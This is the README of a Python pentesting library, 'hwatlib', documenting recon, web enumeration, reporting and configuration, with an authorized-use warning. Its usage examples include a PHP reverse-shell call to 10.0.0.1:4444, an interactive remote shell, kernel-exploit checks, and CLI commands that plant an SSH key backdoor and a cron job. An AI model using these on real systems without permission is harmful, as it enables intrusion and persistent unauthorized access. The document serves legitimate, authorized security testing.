# hwatlib

A practical pentesting and exploitation library with wrappers for recon, web enumeration, reverse shells, and privilege escalation.

> ⚠️ **Authorized use only.** `hwatlib` is offensive-security tooling. Use it
> **only** against systems you own or have **explicit, prior, written
> permission** to test. Unauthorized access to computer systems is illegal in
> most jurisdictions, and you are solely responsible for how you use this
> software. See [SECURITY.md](SECURITY.md) for the full responsible-use policy.
> The CLIs print this reminder to stderr on each run; set `HWAT_NO_BANNER=1` to
> silence it in authorized, scripted environments.

---

To install, run:

```bash
pip3 install hwatlib
```

## Local Development

From the repository root:

```bash
pip3 install -e .
```

## Basic Usage

```python3
from hwatlib import exploit, privesc, recon, web

# Recon example
recon.init("example.com", add_to_hosts=True)
recon.nmap_scan()
recon.banner_grab()

# Web enumeration
web.fetch_all("http://example.com")

# Exploit (reverse shell)
exploit.php_reverse_shell("10.0.0.1", 4444)
```

## Recon Breadth

Dependency-free recon that doesn't require `nmap`:

```python3
from hwatlib import dns, recon, tls

# Async TCP connect port scan (raw asyncio, no python-nmap)
result = recon.scan_ports("10.0.0.1")                 # common ports by default
result = recon.scan_ports("10.0.0.1", recon.parse_ports("1-1024,3306,8080"))
print(result.open_ports)

# Subdomain enumeration: passive (crt.sh CT logs) + active (wordlist brute)
names = dns.discover_subdomains_passive("example.com")          # names from CT logs
found = dns.enumerate_subdomains("example.com", words=["www", "api", "mail"])
print(found)                                                    # {fqdn: ip_or_None}

# TLS / certificate inspection (expiry, SANs, issuer, weak protocol/cipher)
info = tls.inspect_tls("example.com", 443)
print(info.not_after, info.days_until_expiry, info.expired)
print(info.sans, info.protocol, info.cipher, info.weak_protocol)
```

## Privilege Escalation

```python3
from hwatlib import privesc

# Run various local privesc checks
privesc.run_checks()
privesc.enumerate_sudo()
privesc.enumerate_cron()
privesc.kernel_exploits()
```

## Custom IO / Remote Exploitation

```python3
from hwatlib import exploit

# Connect to remote host
remote = exploit.connect_remote("10.0.0.1", 31337)
remote.run_shell("bash")
```

## Web Exploitation

```python3
from hwatlib import web

# Fetchers and enumeration
web.fetch_headers("http://example.com")
web.fetch_forms("http://example.com/login")
web.fetch_js("http://example.com")

# OpenAPI/Swagger discovery: probes common spec locations, detects the
# version/title, and enumerates endpoints (path + HTTP methods).
api = web.discover_openapi("http://api.example.com")
if api.ok:
    print(api.spec_type, api.version, api.spec_url)
    for ep in api.endpoints:
        print(ep.path, ep.methods)
```

OpenAPI discovery is also run automatically as part of `web.scan(...)` and the
unified `hwat report`, appearing under `web.openapi` in the report. JSON specs
are parsed out of the box; YAML specs additionally require `pyyaml`.

## CLI

After installation, these commands are available:

```bash
hwat report <target>
hwat-recon <target>
hwat-web <url>
hwat-exploit <ip> <port>
hwat-privesc          # privesc + post-exploitation checks and actions
hwat-postex           # post-exploitation recon report

# State-changing actions are gated behind --confirm
hwat-privesc add-cronjob "id" --schedule "*/5 * * * *" --confirm
hwat-privesc backdoor-ssh "ssh-ed25519 AAAA..." --confirm
```

### Unified Report CLI

Generate a read-only report (JSON printed to stdout by default):

```bash
hwat report example.com
```

Write report outputs:

```bash
hwat report example.com --out-json report.json --out-md report.md
```

Sitemap export:

```bash
hwat report https://example.com --sitemap-json sitemap.json --sitemap-csv sitemap.csv
```

Machine-readable findings export (composable into other pipelines):

```bash
# SARIF 2.1.0 (upload to GitHub code scanning) and JSON Lines
hwat report example.com --out-sarif findings.sarif --out-jsonl findings.jsonl
```

Or from Python:

```python
from hwatlib import export, workflows

report = workflows.build_report(target="example.com")
export.write_sarif(report, "findings.sarif")   # SARIF 2.1.0
export.write_jsonl(report, "findings.jsonl")   # one finding per line
sarif = export.to_sarif(report)                # or get the dict/str directly
```

Findings map to SARIF severity levels (critical/high → `error`, medium →
`warning`, low/info → `note`) with a GitHub `security-severity` score, rules
deduplicated per finding type, stable `partialFingerprints`, and the report's
run id as `automationDetails.id`.

Plugins:

```bash
hwat report example.com --list-plugins
hwat report example.com --plugin mypkg.mychecks:check
```

### Config / Profiles

By default, hwatlib looks for `~/.config/hwat/config.toml`.

Example:

```toml
[profiles.default.http]
timeout = 7.5
verify = true
rate_limit_per_sec = 2.0

[profiles.default.http.proxies]
http = "http://127.0.0.1:8080"
https = "http://127.0.0.1:8080"

[profiles.default.http.headers]
User-Agent = "hwatlib"
```

Select a profile:

```bash
hwat report example.com --profile default
```

### Config Validation

`hwatlib.config.load_config()` validates both TOML and environment values.
Malformed or out-of-range values are ignored with a warning and safe defaults are used.

If you want fail-fast behavior for CI or production hardening, enable strict mode:

- Python API: `load_config(..., strict=True)`
- Environment: `HWAT_CONFIG_STRICT=1`

In strict mode, invalid/malformed/out-of-range config values raise `ValueError`.

Validated HTTP fields and ranges:

- `timeout`: `0.001..300.0`
- `rate_limit_per_sec`: `0.001..10000.0` (or unset)
- `max_concurrency`: `1..1000`
- `retries`: `0..20`
- `backoff_factor`: `0.0..60.0`
- `verify`: strict boolean (`true/false`, `1/0`, `yes/no`, `on/off` for env)

Environment overrides:

- `HWAT_TIMEOUT`
- `HWAT_VERIFY`
- `HWAT_RATE_LIMIT_PER_SEC`
- `HWAT_MAX_CONCURRENCY`
- `HWAT_RETRIES`
- `HWAT_BACKOFF_FACTOR`
- `HWAT_CONFIG_STRICT`
- `HWAT_PROXY_HTTP`
- `HWAT_PROXY_HTTPS`
- `HWAT_HEADERS_JSON`
- `HWAT_COOKIES_JSON`

Example:

```bash
export HWAT_TIMEOUT=7.5
export HWAT_VERIFY=true
export HWAT_MAX_CONCURRENCY=50
export HWAT_HEADERS_JSON='{"User-Agent":"hwatlib"}'
```

Hwatlib is under continuous development and more features for pentesting, recon, exploitation, and post-exploitation will be added.

## Examples & API Documentation

Runnable examples live in [`examples/`](examples/) (payload generation is offline;
recon/web examples require an authorized target).

API reference docs are generated from docstrings with [`pdoc`](https://pdoc.dev/):

```bash
pip install -e ".[docs]"
make docs          # writes a static site to ./site
make docs-serve    # serves live docs at http://localhost:8080
```

The hosted API reference is published to GitHub Pages automatically on each
release (see [`.github/workflows/docs.yml`](.github/workflows/docs.yml)).

### Project documentation

- [`SECURITY.md`](SECURITY.md) — responsible use & vulnerability reporting.
- [`THREAT_MODEL.md`](THREAT_MODEL.md) — the tool's own security posture (what it will/won't do).
- [`GOVERNANCE.md`](GOVERNANCE.md) — branch protection, required checks, signed commits.
- [`RELEASING.md`](RELEASING.md) — release process & provenance verification.
- [`CONTRIBUTING.md`](CONTRIBUTING.md) — dev setup, quality gates, testing.

## Safer Defaults

- HTTPS requests verify TLS certificates by default. If you *explicitly* need to disable verification, pass `verify=False` (and optionally `suppress_insecure_warning=True`) to `hwatlib.utils.fetch_url()`.
- State-changing post-exploitation helpers require explicit confirmation. For example, use `postex.add_cronjob_confirmed(..., confirm=True)` or `postex.backdoor_ssh_confirmed(..., confirm=True)`.

## Observability & Robustness

### Structured logging with run IDs

`hwatlib` never configures logging on import (it attaches a `NullHandler`). Opt
into visible output — text or machine-parseable JSON — and every log line plus
the report it produces share a **run id** so they can be correlated end-to-end:

```python
from hwatlib import logging_ext, workflows

logging_ext.setup_json_logging()      # JSON lines on stderr (also HWAT_LOG_FORMAT=json)
report = workflows.build_report(target="example.com")
print(report.metadata["run_id"])      # same id that tags every log record
```

From the CLI:

```bash
hwat report example.com --log-format json    # diagnostics to stderr, report JSON to stdout
```

JSON records include `timestamp`, `level`, `logger`, `message`, `run_id`, any
`extra=` fields, and `exc_info` on errors. Use `logging_ext.new_run_id()` /
`set_run_id()` to control the id explicitly.

### Timeouts

Every external process is bounded so a stuck tool can't hang the caller:

- Nmap scans: `recon.run_nmap(..., timeout=300.0)` (also on `nmap_scan` / `nmap_scan_typed`).
- Post-exploitation commands: default 120s, override with `HWAT_CMD_TIMEOUT`.
- `utils.run_command(..., timeout=60.0)` and the internal `nslookup`/`sudo` probes.

HTTP retries/backoff/timeout are governed by `HttpOptions` (sync `HttpClient`
and async `AsyncHttpClient`); see the config section above.

### Typed exceptions

All library errors derive from `hwatlib.HwatlibError`, so callers can catch
precisely instead of using broad `except`:

```python
from hwatlib import exceptions as exc

try:
    remote = exploit.connect_remote("10.0.0.1", 4444)
except exc.TargetUnreachable:
    ...            # DNS/connection failure
except exc.HwatlibError:
    ...            # anything else hwatlib raised
```

Hierarchy: `HwatlibError` → `ConfigError`, `PluginError`, `DependencyError`,
`ScanError`, and `NetworkError` → (`TargetUnreachable`, `RequestError`). For
backwards compatibility several also subclass the built-in they replaced
(`ConfigError`/`PluginError` are `ValueError`; `DependencyError`/`ScanError`/
`RequestError` are `RuntimeError`), so existing `except ValueError`/`except
RuntimeError` code keeps working.
